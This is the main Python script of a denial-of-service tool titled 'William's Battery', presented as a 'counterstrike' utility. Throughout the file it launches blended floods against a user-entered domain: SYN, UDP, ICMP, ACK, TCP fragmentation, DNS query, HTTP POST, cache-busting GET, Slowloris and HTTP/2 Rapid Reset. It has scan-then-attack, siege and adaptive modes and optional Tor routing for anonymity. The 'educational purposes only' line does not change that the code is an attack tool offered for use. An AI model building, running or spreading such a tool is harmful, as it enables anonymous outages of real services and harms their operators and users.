# main.py (Updated to integrate H2 Rapid Reset into blended profiles)

import threading
import time
import socket
import counter_strike_helper


def launch_attack_thread(target_func, args_tuple):
    """Helper to create, start, and return a daemon thread."""
    thread = threading.Thread(target=target_func, args=args_tuple)
    thread.daemon = True
    thread.start()
    return thread


# --- NEW: RECON-LED ATTACK ORCHESTRATOR ---
def reconnaissance_led_strike(target, use_proxy, network_interface):
    """
    First, runs a port scan to find open services, then launches a 'Fast Scale'
    attack targeted ONLY at the discovered open ports.
    """
    print("\n" + "=" * 60)
    print("MODE: RECONNAISSANCE-LED STRIKE (INTELLIGENT STRIKE)")
    print("=" * 60)

    # --- Phase 1: Reconnaissance ---
    # Define which ports to scan. A common range is 1-1024.
    # For a faster test, you can provide a specific list.
    common_ports = list(range(1, 1025))
    # Add other common high ports
    common_ports.extend([3306, 3389, 5432, 8000, 8080, 8443])

    # Run the port scan and get the list of open ports
    discovered_open_ports = counter_strike_helper.run_port_scan(target, common_ports, threads=200)

    if not discovered_open_ports:
        print("[!] No open ports found. Cannot launch a targeted attack. Aborting.")
        return

    print(f"[ATTACK] Open ports discovered: {discovered_open_ports}")
    input("Press Enter to launch the targeted attack on these ports...")

    # --- Phase 2: Targeted Attack ---
    print("\n[+] Launching targeted 'Fast Scale' attack...")
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    params = {"threads": 100, "h2_threads": 25, "duration": 120}
    print(
        f"[CONFIG] Using {params['threads']} flood threads and {params['h2_threads']}"
        f" H2 connections for {params['duration']}s.")

    # --- Dynamically launch attacks ONLY on open ports ---
    if use_proxy:
        print("[PROXY] L7 attacks will be routed through the proxy.")

    # Always launch DNS Query Flood as it's a primary vector
    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))

    # For each open port, launch the appropriate attack
    for port in discovered_open_ports:
        # SYN Flood every open TCP port
        syn_args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, syn_args))

        # If it's a common web port, also launch L7 attacks
        if port in [80, 443, 8000, 8080, 8443]:
            post_args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
            attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, post_args))

            # Only launch H2 on standard TLS ports
            if port in [443, 8443]:
                h2_args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
                attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, h2_args))

    print(f"[+] Targeted attack launched. Press Ctrl+C to stop.")
    try:
        time.sleep(params["duration"])
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()


def full_scale_counter_strike(target, use_proxy, network_interface):
    """
    Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack.
    This is a siege designed to run for a long time.
    """
    print("=" * 60 + "\nMODE: FULL SCALE COUNTER-STRIKE (SIEGE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    # --- REVISED, more realistic parameters for the siege ---
    params = {
        "threads": 80,  # Drastically reduced for floods
        "slowloris_sockets": 150,  # Still high, as these are lightweight
        "h2_threads": 20,  # Still very effective with fewer threads
        "duration": 360,
    }
    print(
        f"[CONFIG] Siege mode: Using {params['threads']} flood threads, {params['slowloris_sockets']} "
        f"Slowloris sockets, and {params['h2_threads']} H2 connections.")

    # --- Launch Network Layer Floods (L3/L4) ---
    print("[+] Preparing L3/L4 vectors (UDP, SYN, ICMP, TCP Frag)...")
    for port in [53, 123]:  # UDP
        args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
    for port in [80, 443, 22, 3389, 25]:  # SYN
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)  # ICMP
    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
    # NEW: TCP Fragmentation Attack on common web ports
    for port in [80, 443]:
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_tcp_fragmentation, args))
    # NEW: TCP ACK Flood on common web ports
    for port in [80, 443]:
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_ack_flood, args))

    # --- Launch Application Layer Floods (L7) ---
    print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)  # DNS Query
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
    if use_proxy:
        print("[PROXY] HTTP POST and Slowloris attacks will be routed through the proxy.")

    # NEW: HTTP Cache-Busting GET Flood (Proxy-aware)
    for port in [80, 443]:
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_cache_bust, args))
    # HTTP POST (Proxy-aware)
    for port in [80, 443, 8080]:
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
    # Slowloris (Proxy-aware)
    for port in [80, 443]:
        args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"], use_proxy)
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))
    for port in [443, 8443]:  # H2 Reset
        args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, args))

    print(f"[+] Full-scale attack launched. Press Ctrl+C to stop.")
    try:
        while any(t.is_alive() for t in attack_threads):
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Signaling all threads to stop...")
        stop_event.set()


def fast_scale_counter_strike(target, use_proxy, network_interface):
    """
    Launches a FAST, INTENSE, blended, multi-threaded counter-attack.
    Includes the more effective HTTP POST and H2 Rapid Reset floods.
    """
    print("=" * 60 + "\nMODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    params = {
        "threads": 100,  # Moderate thread count
        "h2_threads": 25,  # Fewer H2 threads
        "duration": 60,
    }
    print(f"[CONFIG] Surgical mode: Using {params['threads']} flood threads and {params['h2_threads']} H2 connections.")

    # Launch focused attacks
    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)  # DNS Query
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
    for port in [80, 443, 22]:  # SYN
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, (
            target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)))
    for port in [80, 443]:  # HTTP POST
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, (
            target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)))
    # NEW: HTTP/2 Rapid Reset
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, (
        target, 443, params["duration"], stop_event, pause_event, params["h2_threads"])))

    print(f"[+] Fast-scale attack launched. Running for {params['duration']}s. Press Ctrl+C to stop.")
    try:
        time.sleep(params["duration"])
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()


def adaptive_strike(target, use_proxy, network_interface):
    """Launches a 'Fast Scale' profile managed by an adaptive controller."""
    print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
    try:
        check_port = int(input("Enter the port to monitor for target status (e.g., 443): "))
        check_interval = int(input("Enter the status check interval in seconds (e.g., 15): "))
        total_duration = int(input("Enter the total attack duration in seconds (e.g., 600): "))
        threads = int(input("Enter number of threads for classic floods (e.g., 150): "))
        h2_threads = int(input("Enter number of H2 connections (e.g., 40): "))
        target_ip = socket.gethostbyname(target)
    except (ValueError, socket.gaierror) as err:
        print(f"[!] Invalid input or could not resolve host: {err}. Aborting.")
        return

    stop_event, pause_event = threading.Event(), threading.Event()

    # Define the attack profile, now including H2 Rapid Reset
    attack_profile = [
        (counter_strike_helper.attack_dns_query_flood,
         (target, total_duration, stop_event, pause_event, threads, network_interface)),
        (counter_strike_helper.synflood,
         (target, 80, total_duration, stop_event, pause_event, threads, network_interface)),
        (counter_strike_helper.attack_http_post,
         (target, 80, total_duration, stop_event, pause_event, threads, use_proxy)),
        # NEW: HTTP/2 Rapid Reset
        (counter_strike_helper.attack_h2_rapid_reset,
         (target, 443, total_duration, stop_event, pause_event, h2_threads)),
    ]

    for func, args in attack_profile:
        launch_attack_thread(func, args)

    controller_args = (target_ip, check_port, stop_event, pause_event, check_interval)
    launch_attack_thread(counter_strike_helper.adaptive_attack_controller, controller_args)

    print(f"[+] Adaptive attack launched. Total duration: {total_duration}s. Press Ctrl+C to stop.")
    try:
        time.sleep(total_duration)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()
        time.sleep(2)


# --- Main Execution Block with Auto-Detection ---
if __name__ == "__main__":
    print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)

    # --- NEW: Auto-detect the network interface ---
    NETWORK_INTERFACE = counter_strike_helper.auto_detect_interface()
    if not NETWORK_INTERFACE:
        print("[ERROR] Failed to identify network interface. Scapy attacks may fail.")
        print("[INFO] You may need to manually specify the interface in the code if attacks are not working.")
        # The script will continue, but the user is warned.

    print("This tool is for educational purposes ONLY. Use responsibly and legally.")
    target_domain = str(input("Please Enter The Domain Name Of Your Target: "))

    proxy_choice = input("Enable SOCKS Proxy (Tor) for L7 attacks (y/n): ").lower()
    proxy_enabled = True if proxy_choice == 'y' else False
    if proxy_enabled:
        # --- NEW: Check if the Tor connection is actually working ---
        if not counter_strike_helper.check_tor_connection():
            print("[ERROR] Tor is not working correctly. Disabling proxy for this session.")
            proxy_enabled = False
        else:
            print("[!] Tor enabled. L7 attacks will be slower but anonymized.")

    try:
        options_text = """
    Select an Attack Profile:
      1: Full Scale Counterstrike (Max-power siege on common ports)
      2: Fast Counterstrike (Short, intense burst on critical ports)
      3: Adaptive Counterstrike (Smart, responsive attack)
      4: Recon-led Strike (Scan first, then attack only open ports)

    Please enter your option: """
        options = int(input(options_text))

        if options == 1:
            full_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
        elif options == 2:
            fast_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
        elif options == 3:
            adaptive_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
        elif options == 4:
            reconnaissance_led_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
        else:
            print("Invalid option selected. Exiting.")

    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
